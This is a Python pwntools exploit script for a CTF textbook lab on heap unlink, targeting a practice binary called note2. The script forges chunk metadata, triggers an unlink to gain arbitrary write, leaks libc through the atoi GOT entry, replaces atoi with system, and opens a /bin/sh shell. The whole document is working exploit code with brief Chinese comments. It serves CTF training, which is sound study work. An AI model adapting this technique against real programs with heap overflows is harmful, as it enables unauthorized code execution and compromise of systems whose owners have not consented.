# 从0到1：CTFer成长之路-PWN篇_实验 17 unlink
from pwn import *

s = process('./note2')
# context(log_level='debug', arch='amd64', os='linux')
context(log_level='debug', arch='amd64', os='linux')


# context.terminal = ["tmux", "splitw", "-v"]


def cmd(i):
    s.sendlineafter("option--->>", str(i))


def new(size, buf):
    cmd(1)
    s.sendlineafter("content:(less than 128)", str(size))
    s.sendlineafter("Input the note content:", buf)


def show(idx):
    cmd(2)
    s.sendlineafter('Input the id of the note:', str(idx))


def edit(idx, typex, buf):
    cmd(3)
    s.sendlineafter("Input the id of the note:", str(idx))
    s.sendlineafter("append?[1.overwrite/2.append]", str(typex))
    s.sendlineafter("TheNewContents:", buf)


def free(idx):
    cmd(4)
    s.sendlineafter('note:', str(idx))

def dbg():
    gdb.attach(s, 'b *0x400b09\n' # getnum
                  'b *0x400C67\n' # free
                  'b *0x0400D22\n'
                  'c')

s.sendlineafter("Input your name:", 't')
s.sendlineafter("Input your address:", 'ttt')

ptr = 0x602120
fake_prev = 0
fake_size = 0x80 + 0x20 + 1  # 标记为 prev_inuse 防止合并
fake_fd = ptr - 0x18
fake_bk = ptr - 0x10
# 33:55

payload = flat(fake_prev, fake_size, fake_fd, fake_bk)
# gdb.attach(s, 'b *0x400b09\nc')

new(0x80, payload)
new(0, '')
dbg()
new(0x80, '1')

free(1)
# fakesize - 1 溢出修改下个chunk, 将P位置0产生合并
new(0, flat('a' * 0x10, fake_size - 1, 0x90))


# new(0x80, '1\n')
# new(0x80, 's'*0x80)

free(2)
elf = ELF('./note2')
libc = ELF('./libc-2.23.so')
success('--atoi---' + hex(elf.got['atoi']))
payload = flat('A' * 0x18, elf.got['atoi'], ptr)
edit(0, 1, payload)
# gdb.attach(s, 'b *0x400b09\nc')
show(0)
libc.address = u64(s.recvuntil('\x7f')[-6:] + b'\x00\x00') - libc.sym['atoi']
success('libc: ' + hex(libc.address))
# gdb.attach(s, 'b *0x400b09\nc')

edit(0, 1, p64(libc.sym['system']))
s.sendline('/bin/sh')
s.interactive()
